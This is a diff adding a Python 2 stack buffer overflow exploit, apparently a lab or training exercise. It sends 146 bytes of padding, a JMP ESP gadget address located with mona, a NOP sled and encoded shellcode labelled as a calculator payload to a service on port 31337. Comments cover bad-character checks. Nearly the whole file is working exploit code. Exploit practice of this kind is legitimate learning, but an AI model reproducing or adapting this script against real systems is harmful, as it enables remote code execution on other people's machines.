@@ -1,0 +1,65 @@
+#!/usr/bin/env python2
+import socket
+
+RHOST="192.168.2.211"
+RPORT=31337
+
+badchar_test = ""
+badchars = [0x00, 0x0A] #know in advance because of string input
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((RHOST, RPORT))
+
+#find gardget locations
+#!mona jmp -r esp -cpb "\x00\x0A"
+#080414c3,080416bf
+addr_jmp_esp=0x080414c3
+import struct
+addr_jmp_esp_LE=struct.pack("<I",addr_jmp_esp)
+buf_totlen=1024
+offset=146
+
+#need nops to have it read the shellcode right.
+#or could use: msf-metasmshell and then sub esp,0x10
+
+shellcode_calc="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+shellcode_calc += b"\xb8\x9c\xf8\x1c\x9c\xd9\xed\xd9\x74\x24"
+shellcode_calc += b"\xf4\x5d\x29\xc9\xb1\x31\x31\x45\x13\x83"
+shellcode_calc += b"\xed\xfc\x03\x45\x93\x1a\xe9\x60\x43\x58"
+shellcode_calc += b"\x12\x99\x93\x3d\x9a\x7c\xa2\x7d\xf8\xf5"
+shellcode_calc += b"\x94\x4d\x8a\x58\x18\x25\xde\x48\xab\x4b"
+shellcode_calc += b"\xf7\x7f\x1c\xe1\x21\xb1\x9d\x5a\x11\xd0"
+shellcode_calc += b"\x1d\xa1\x46\x32\x1c\x6a\x9b\x33\x59\x97"
+shellcode_calc += b"\x56\x61\x32\xd3\xc5\x96\x37\xa9\xd5\x1d"
+shellcode_calc += b"\x0b\x3f\x5e\xc1\xdb\x3e\x4f\x54\x50\x19"
+shellcode_calc += b"\x4f\x56\xb5\x11\xc6\x40\xda\x1c\x90\xfb"
+shellcode_calc += b"\x28\xea\x23\x2a\x61\x13\x8f\x13\x4e\xe6"
+shellcode_calc += b"\xd1\x54\x68\x19\xa4\xac\x8b\xa4\xbf\x6a"
+shellcode_calc += b"\xf6\x72\x35\x69\x50\xf0\xed\x55\x61\xd5"
+shellcode_calc += b"\x68\x1d\x6d\x92\xff\x79\x71\x25\xd3\xf1"
+shellcode_calc += b"\x8d\xae\xd2\xd5\x04\xf4\xf0\xf1\x4d\xae"
+shellcode_calc += b"\x99\xa0\x2b\x01\xa5\xb3\x94\xfe\x03\xbf"
+shellcode_calc += b"\x38\xea\x39\xe2\x56\xed\xcc\x98\x14\xed"
+shellcode_calc += b"\xce\xa2\x08\x86\xff\x29\xc7\xd1\xff\xfb"
+shellcode_calc += b"\xac\x3e\xe2\x29\xd8\xd6\xbb\xbb\x61\xbb"
+shellcode_calc += b"\x3b\x16\xa5\xc2\xbf\x93\x55\x31\xdf\xd1"
+shellcode_calc += b"\x50\x7d\x67\x09\x28\xee\x02\x2d\x9f\x0f"
+shellcode_calc += b"\x07\x4e\x7e\x9c\xcb\xbf\xe5\x24\x69\xc0"
+
+
+buf=""
+buf="A"*(offset - len(buf)) #probably not necessary to sub 0?
+buf+= addr_jmp_esp_LE
+buf+= shellcode_calc #esp points here
+buf+= "D"*(buf_totlen - len(buf)) # keep size the same
+buf+="\n"
+
+s.send(buf)
+
+print("Send: {0}".format(buf))
+
+data=s.recv(1024)
+print("Received: {}".format(data))
+
+#!mona compare -a esp -f c:\badchartest.bin
+#to compare them
